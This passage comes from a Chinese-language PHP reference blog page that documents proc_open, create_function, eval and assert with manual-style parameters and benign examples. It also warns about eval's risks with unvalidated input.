例如，可以通过指定文件描述符将密码以更加安全的方式 传送至诸如 PGP，GPG 和 openssl 程序， 同时也可以很方便的获取这些程序的状态信息。</span><br><span class="line"></span><br><span class="line">pipes<span class="comment">#将被置为索引数组， 其中的元素是被执行程序创建的管道对应到 PHP 这一端的文件指针。</span></span><br><span class="line"></span><br><span class="line">cwd<span class="comment">#要执行命令的初始工作目录。 必须是 绝对 路径， 设置此参数为 NULL 表示使用默认值（当前 PHP 进程的工作目录）。</span></span><br><span class="line"></span><br><span class="line">env<span class="comment">#要执行的命令所使用的环境变量。 设置此参数为 NULL 表示使用和当前 PHP 进程相同的环境变量。</span></span><br><span class="line"></span><br><span class="line">other_options</span><br><span class="line"><span class="comment">#你还可以指定一些附加选项。 目前支持的选项包括：</span></span><br><span class="line">suppress_errors （仅用于 Windows 平台）： <span class="comment">#设置为 TRUE 表示抑制本函数产生的错误。</span></span><br><span class="line">bypass_shell （仅用于 Windows 平台）： <span class="comment">#设置为 TRUE 表示绕过 cmd.exe shell。</span></span><br><span class="line"></span><br><span class="line">* 返回值</span><br><span class="line"></span><br><span class="line">返回表示进程的资源类型， 当使用完毕之后，请调用 proc_close() 函数来关闭此资源。 如果失败，返回 FALSE。</span><br><span class="line"></span><br><span class="line">* 示例</span><br><span class="line"></span><br><span class="line">​```php</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$descriptorspec</span> = array(</span><br><span class="line">   0 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  // 标准输入，子进程从此管道中读取数据</span><br><span class="line">   1 =&gt; array(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  // 标准输出，子进程向此管道中写入数据</span><br><span class="line">   2 =&gt; array(<span class="string">&quot;file&quot;</span>, <span class="string">&quot;/tmp/error-output.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) // 标准错误，写入到一个文件</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cwd</span> = <span class="string">&#x27;/tmp&#x27;</span>;</span><br><span class="line"><span class="variable">$env</span> = array(<span class="string">&#x27;some_option&#x27;</span> =&gt; <span class="string">&#x27;aeiou&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = proc_open(<span class="string">&#x27;php&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>, <span class="variable">$cwd</span>, <span class="variable">$env</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_resource(<span class="variable">$process</span>)) &#123;</span><br><span class="line">    // <span class="variable">$pipes</span> 现在看起来是这样的：</span><br><span class="line">    // 0 =&gt; 可以向子进程标准输入写入的句柄</span><br><span class="line">    // 1 =&gt; 可以从子进程标准输出读取的句柄</span><br><span class="line">    // 错误输出将被追加到文件 /tmp/error-output.txt</span><br><span class="line"></span><br><span class="line">    fwrite(<span class="variable">$pipes</span>[0], <span class="string">&#x27;&lt;?php print_r($_ENV); ?&gt;&#x27;</span>);</span><br><span class="line">    fclose(<span class="variable">$pipes</span>[0]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> stream_get_contents(<span class="variable">$pipes</span>[1]);</span><br><span class="line">    fclose(<span class="variable">$pipes</span>[1]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    // 切记：在调用 proc_close 之前关闭所有的管道以避免死锁。</span><br><span class="line">    <span class="variable">$return_value</span> = proc_close(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;command returned <span class="variable">$return_value</span>\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">    </span><br><span class="line"><span class="comment">#以上例程的输出类似于：</span></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [some_option] =&gt; aeiou</span><br><span class="line">    [PWD] =&gt; /tmp</span><br><span class="line">    [SHLVL] =&gt; 1</span><br><span class="line">    [_] =&gt; /usr/<span class="built_in">local</span>/bin/php</span><br><span class="line">)</span><br><span class="line"><span class="built_in">command</span> returned 0</span><br></pre></td></tr></table></figure><p><strong>create_function</strong></p><ul><li>用法：</li></ul><p>创建一个匿名（lambda样式）函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( <span class="keyword">string</span> <span class="variable">$args</span> , <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p>根据传递的参数创建匿名函数，并为其返回唯一名称。<br>此函数在内部执行eval（），因此具有与eval（）相同的安全问题。此外，它还具有较差的性能和内存使用特性。</p><p>如果您使用的是PHP5.3.0或更新版本，则应使用本机匿名函数。</p><ul><li>参数</li></ul><p>通常，这些参数将作为单引号分隔的字符串传递。使用单引号字符串的原因是为了防止解析变量名，否则，如果使用双引号，则需要转义变量名，例如$avar。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">args <span class="comment">#函数参数。</span></span><br><span class="line"></span><br><span class="line">code <span class="comment">#函数代码。</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>以字符串形式返回唯一的函数名，出错时返回FALSE。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用create#u function（）创建匿名函数，您可以使用此函数（例如）根据运行时收集的信息创建函数：</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$newfunc</span> = create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;New anonymous function: <span class="subst">$newfunc</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$newfunc</span>(<span class="number">2</span>, M_E) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line"><span class="comment">//新的匿名函数：lambda_1</span></span><br><span class="line"><span class="comment">//ln（2）+ln（2.718281828459）=1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="keyword">Or</span>, perhaps to have general handler <span class="function"><span class="keyword">function</span> <span class="title">that</span> <span class="title">can</span> <span class="title">apply</span> <span class="title">a</span> <span class="title">set</span> <span class="title">of</span> <span class="title">operations</span> <span class="title">to</span> <span class="title">a</span> <span class="title">list</span> <span class="title">of</span> <span class="title">parameters</span>:</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#使用<span class="title">create</span>#<span class="title">u</span>函数（）生成通用处理函数</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="function"><span class="title">function</span> <span class="title">process</span>(<span class="params"><span class="variable">$var1</span>, <span class="variable">$var2</span>, <span class="variable">$farr</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$farr</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$f</span>(<span class="variable">$var1</span>, <span class="variable">$var2</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一组数学函数</span></span><br><span class="line"><span class="variable">$f1</span> = <span class="string">&#x27;if ($a &gt;=0) &#123;return &quot;b*a^2 = &quot;.$b*sqrt($a);&#125; else &#123;return false;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$f2</span> = <span class="string">&quot;return \&quot;min(b^2+a, a^2,b) = \&quot;.min(\$a*\$a+\$b,\$b*\$b+\$a);&quot;</span>;</span><br><span class="line"><span class="variable">$f3</span> = <span class="string">&#x27;if ($a &gt; 0 &amp;&amp; $b != 0) &#123;return &quot;ln(a)/b = &quot;.log($a)/$b; &#125; else &#123; return false; &#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$farr</span> = <span class="keyword">array</span>(</span><br><span class="line">    create_function(<span class="string">&#x27;$x,$y&#x27;</span>, <span class="string">&#x27;return &quot;some trig: &quot;.(sin($x) + $x*cos($y));&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$x,$y&#x27;</span>, <span class="string">&#x27;return &quot;a hypotenuse: &quot;.sqrt($x*$x + $y*$y);&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$f1</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$f2</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="variable">$f3</span>)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\nUsing the first array of anonymous functions\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;parameters: 2.3445, M_PI\n&quot;</span>;</span><br><span class="line">process(<span class="number">2.3445</span>, M_PI, <span class="variable">$farr</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//现在制作一组字符串处理函数</span></span><br><span class="line"><span class="variable">$garr</span> = <span class="keyword">array</span>(</span><br><span class="line">    create_function(<span class="string">&#x27;$b,$a&#x27;</span>, <span class="string">&#x27;if (strncmp($a, $b, 3) == 0) return &quot;** \&quot;$a\&quot; &#x27;</span>.</span><br><span class="line">    <span class="string">&#x27;and \&quot;$b\&quot;\n** Look the same to me! (looking at the first 3 chars)&quot;;&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;; return &quot;CRCs: &quot; . crc32($a) . &quot;, &quot;.crc32($b);&#x27;</span>),</span><br><span class="line">    create_function(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;; return &quot;similar(a,b) = &quot; . similar_text($a, $b, &amp;$p) . &quot;($p%)&quot;;&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\nUsing the second array of anonymous functions\n&quot;</span>;</span><br><span class="line">process(<span class="string">&quot;Twas brilling and the slithy toves&quot;</span>, <span class="string">&quot;Twas the night&quot;</span>, <span class="variable">$garr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line">Using the first <span class="keyword">array</span> of anonymous functions</span><br><span class="line">parameters: <span class="number">2.3445</span>, M_PI</span><br><span class="line">some trig: -<span class="number">1.6291725057799</span></span><br><span class="line">a hypotenuse: <span class="number">3.9199852871011</span></span><br><span class="line">b*a^<span class="number">2</span> = <span class="number">4.8103313314525</span></span><br><span class="line">min(b^<span class="number">2</span>+a, a^<span class="number">2</span>,b) = <span class="number">8.6382729035898</span></span><br><span class="line">ln(a)/b = <span class="number">0.27122299212594</span></span><br><span class="line"></span><br><span class="line">Using the second <span class="keyword">array</span> of anonymous functions</span><br><span class="line">** <span class="string">&quot;Twas the night&quot;</span> <span class="keyword">and</span> <span class="string">&quot;Twas brilling and the slithy toves&quot;</span></span><br><span class="line">** Look the same to me! (looking at the first <span class="number">3</span> chars)</span><br><span class="line">CRCs: -<span class="number">725381282</span>, <span class="number">342550513</span></span><br><span class="line">similar(a,b) = <span class="number">11</span>(<span class="number">45.833333333333</span>%)</span><br><span class="line">But perhaps the most common <span class="keyword">use</span> <span class="title">for</span> <span class="title">of</span> <span class="title">lambda</span>-<span class="title">style</span> (<span class="title">anonymous</span>) <span class="title">functions</span> <span class="title">is</span> <span class="title">to</span> <span class="title">create</span> <span class="title">callback</span> <span class="title">functions</span>, <span class="title">for</span> <span class="title">example</span> <span class="title">when</span> <span class="title">using</span> <span class="title">array_walk</span>() <span class="title">or</span> <span class="title">usort</span>()</span><br><span class="line"></span><br><span class="line"><span class="title">Example</span> #3 使用匿名函数作为回调函数</span><br><span class="line"></span><br><span class="line">&lt;?<span class="title">php</span></span><br><span class="line">$<span class="title">av</span> = <span class="title">array</span>(&quot;<span class="title">the</span> &quot;, &quot;<span class="title">a</span> &quot;, &quot;<span class="title">that</span> &quot;, &quot;<span class="title">this</span> &quot;);</span><br><span class="line">array_walk(<span class="variable">$av</span>, create_function(<span class="string">&#x27;&amp;$v,$k&#x27;</span>, <span class="string">&#x27;$v = $v . &quot;mango&quot;;&#x27;</span>));</span><br><span class="line">print_r(<span class="variable">$av</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">  [<span class="number">0</span>] =&gt; the mango</span><br><span class="line">  [<span class="number">1</span>] =&gt; a mango</span><br><span class="line">  [<span class="number">2</span>] =&gt; that mango</span><br><span class="line">  [<span class="number">3</span>] =&gt; this mango</span><br><span class="line">)</span><br><span class="line">an <span class="keyword">array</span> of strings ordered <span class="keyword">from</span> shorter to longer</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$sv</span> = <span class="keyword">array</span>(<span class="string">&quot;small&quot;</span>, <span class="string">&quot;larger&quot;</span>, <span class="string">&quot;a big string&quot;</span>, <span class="string">&quot;it is a string thing&quot;</span>);</span><br><span class="line">print_r(<span class="variable">$sv</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">  [<span class="number">0</span>] =&gt; small</span><br><span class="line">  [<span class="number">1</span>] =&gt; larger</span><br><span class="line">  [<span class="number">2</span>] =&gt; a big <span class="keyword">string</span></span><br><span class="line">  [<span class="number">3</span>] =&gt; it is a <span class="keyword">string</span> thing</span><br><span class="line">)</span><br><span class="line">sort it <span class="keyword">from</span> longer to shorter</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">usort(<span class="variable">$sv</span>, create_function(<span class="string">&#x27;$a,$b&#x27;</span>,<span class="string">&#x27;return strlen($b) - strlen($a);&#x27;</span>));</span><br><span class="line">print_r(<span class="variable">$sv</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上示例会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">  [<span class="number">0</span>] =&gt; it is a <span class="keyword">string</span> thing</span><br><span class="line">  [<span class="number">1</span>] =&gt; a big <span class="keyword">string</span></span><br><span class="line">  [<span class="number">2</span>] =&gt; larger</span><br><span class="line">  [<span class="number">3</span>] =&gt; small</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>eval</strong></p><ul><li>用法</li></ul><p>把字符串作为PHP代码执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> ) : <span class="keyword">mixed</span>把字符串</span><br></pre></td></tr></table></figure><p> code 作为PHP代码执行。<br>函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、未经完整验证过的数据 。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code<span class="comment">#需要被执行的字符串</span></span><br><span class="line"></span><br><span class="line">代码不能包含打开/关闭 PHP tags。比如， <span class="string">&#x27;echo &quot;Hi!&quot;;&#x27;</span> 不能这样传入： <span class="string">&#x27;&lt;?php echo &quot;Hi!&quot;; ?&gt;&#x27;</span>。但仍然可以用合适的 PHP tag 来离开、重新进入 PHP 模式。比如 <span class="string">&#x27;echo &quot;In PHP mode!&quot;; ?&gt;In HTML mode!&lt;?php echo &quot;Back in PHP mode!&quot;;&#x27;</span>。</span><br><span class="line"></span><br><span class="line">除此之外，传入的必须是有效的 PHP 代码。所有的语句必须以分号结尾。比如 <span class="string">&#x27;echo &quot;Hi!&quot;&#x27;</span> 会导致一个 parse error，而 <span class="string">&#x27;echo &quot;Hi!&quot;;&#x27;</span> 则会正常运行。</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> 语句会立即中止当前字符串的执行。</span><br><span class="line"></span><br><span class="line">代码执行的作用域是调用 <span class="built_in">eval</span>() 处的作用域。因此，<span class="built_in">eval</span>() 里任何的变量定义、修改，都会在函数结束后被保留</span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>eval() 返回 NULL，除非在执行的代码中 return 了一个值，函数返回传递给 return 的值。 PHP 7 开始，执行的代码里如果有一个 parse error，eval() 会抛出 ParseError 异常。在 PHP 7 之前， 如果在执行的代码中有 parse error，eval() 返回 FALSE，之后的代码将正常执行。无法使用 set_error_handler() 捕获 eval() 中的解析错误。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;cup&#x27;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;coffee&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is a $string with my $name in it.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$str = \&quot;<span class="subst">$str</span>\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">This is a <span class="variable">$string</span> with my <span class="variable">$name</span> in it.</span><br><span class="line">This is a cup with my coffee in it</span><br></pre></td></tr></table></figure><p><strong>assert</strong></p><ul><li>用法</li></ul><p>检查一个断言是否为 FALSE</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php5</span></span><br><span class="line">assert ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] ) : <span class="keyword">bool</span></span><br><span class="line"><span class="comment">#php7</span></span><br><span class="line">assert ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><p>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动。</p><p>Traditional assertions (PHP 5 and 7)<br>如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。 assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串。</p><p>断言这个功能应该只被用来调试。 你应该用于完整性检查时测试条件是否始终应该为 TRUE，来指示某些程序错误，或者检查具体功能的存在（类似扩展函数或特定的系统限制和功能）。</p><p>断言不应该用于普通运行时操作，类似输入参数的检查。 作为一个经验法则，在断言禁用时你的代码也应该能够正确地运行。</p><p>assert() 的行为可以通过 assert_options() 来配置，或者手册页面上描述的 .ini 设置。</p><p>assert_options() ASSERT_CALLBACK 配置指令允许设置回调函数来处理失败的断言。</p><p>assert() 回调函数在构建自动测试套件的时候尤其有用，因为它们允许你简易地捕获传入断言的代码，并包含断言的位置信息。 当信息能够被其他方法捕获，使用断言可以让它更快更方便！</p><p>回调函数应该接受三个参数。 第一个参数包括了断言失败所在的文件。 第二个参数包含了断言失败所在的行号，第三个参数包含了失败的表达式（如有任意 — 字面值例如 1 或者 “two” 将不会传递到这个参数）。 PHP 5.4.8 及更高版本的用户也可以提供第四个可选参数，如果设置了，用于将 description 指定到 assert()。</p><p>Expectations（仅适用于PHP 7）</p><p>assert（）是PHP7中的一种语言构造，允许定义Expectations：在开发和测试环境中生效的断言，但经过优化后在生产中实现零成本。</p><p>尽管出于向后兼容性的原因，assert_options（）仍然可以用于控制上述行为，但仅PHP 7代码应该使用两个新的配置指令来控制assert（）的行为，而不是调用assert_options（）。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">assertion</span><br><span class="line"><span class="comment">#断言。在PHP5中，这必须是要计算的字符串或要测试的布尔值。在PHP7中，这也可以是任何返回值的表达式，该值将被执行，结果用于指示断言是成功还是失败。</span></span><br><span class="line"></span><br><span class="line">descripton</span><br><span class="line"><span class="comment">#如果 断言失败了，选项 描述将会包括在失败信息里。</span></span><br><span class="line"></span><br><span class="line">exception</span><br><span class="line"><span class="comment">#在PHP7中，第二个参数可以是一个Throwable对象，而不是描述性字符串，在这种情况下，如果断言失败并且启用了assert.exception配置指令，将抛出该对象。</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>assertion 是 false 则返回 FALSE，否则是 TRUE。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用自定义处理程序处理失败的断言</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 激活断言，并设置它为 quiet</span></span><br><span class="line">assert_options(ASSERT_ACTIVE, <span class="number">1</span>);</span><br><span class="line">assert_options(ASSERT_WARNING, <span class="number">0</span>);</span><br><span class="line">assert_options(ASSERT_QUIET_EVAL, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_assert_handler</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$line</span>, <span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;Assertion Failed:</span></span><br><span class="line"><span class="string">        File &#x27;<span class="subst">$file</span>&#x27;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        Line &#x27;<span class="subst">$line</span>&#x27;&lt;br /&gt;</span></span><br><span class="line"><span class="string">        Code &#x27;<span class="subst">$code</span>&#x27;&lt;br /&gt;&lt;hr /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置回调函数</span></span><br><span class="line">assert_options(ASSERT_CALLBACK, <span class="string">&#x27;my_assert_handler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 让一则断言失败</span></span><br><span class="line">assert(<span class="string">&#x27;mysql_query(&quot;&quot;)&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#使用自定义处理器打印描述信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 激活断言，并设置它为 quiet</span></span><br><span class="line">assert_options(ASSERT_ACTIVE, <span class="number">1</span>);</span><br><span class="line">assert_options(ASSERT_WARNING, <span class="number">0</span>);</span><br><span class="line">assert_options(ASSERT_QUIET_EVAL, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_assert_handler</span>(<span class="params"><span class="variable">$file</span>, <span class="variable">$line</span>, <span class="variable">$code</span>, <span class="variable">$desc</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span 